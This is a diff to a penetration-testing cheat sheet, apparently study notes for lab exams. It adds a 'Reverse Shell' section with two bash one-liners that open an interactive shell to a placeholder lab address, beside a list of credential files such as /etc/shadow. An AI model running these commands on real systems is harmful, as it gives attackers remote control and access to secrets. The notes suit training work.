@@ -1,6 +1,7 @@
 # Table of Content
 - [General](#general)
   - [Important Files](#important-files)
+  - [Reverse Shell](#reverse-shell)
 - [Web Attacks](#web-attacks)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -26,6 +27,13 @@ C:/Users/Administrator/NTUser.dat
 /etc/passwd
 /etc/shadow
 /etc/aliases
+```
+
+## Reverse Shell
+```bash
+bash -i >& /dev/tcp/192.168.45.x/80 0>&1
+bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
+
 ```
 
 # Web Attacks
